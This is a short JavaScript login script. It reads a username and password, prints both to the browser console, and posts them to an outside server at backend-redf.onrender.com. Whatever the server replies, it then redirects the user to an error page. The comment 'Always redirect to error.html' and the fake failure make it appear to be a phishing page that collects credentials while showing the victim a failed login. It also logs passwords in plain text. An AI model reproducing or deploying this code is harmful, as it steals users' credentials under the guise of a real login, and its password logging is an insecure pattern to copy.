document.getElementById("loginBtn").addEventListener("click", login);

async function login() {
    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    console.log("Attempting login with:", username, password);

    try {
        const response = await fetch("https://backend-redf.onrender.com/login", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ username, password })
        });

        console.log("Response status:", response.status);

        if (!response.ok) {
            throw new Error("Failed to login");
        }

        const responseData = await response.json();
        console.log("Response data:", responseData);

        // Always redirect to error.html
        window.location.href = "error.html";

    } catch (error) {
        console.error("Fetch Error:", error);
        alert("Something went wrong!");
    }
}
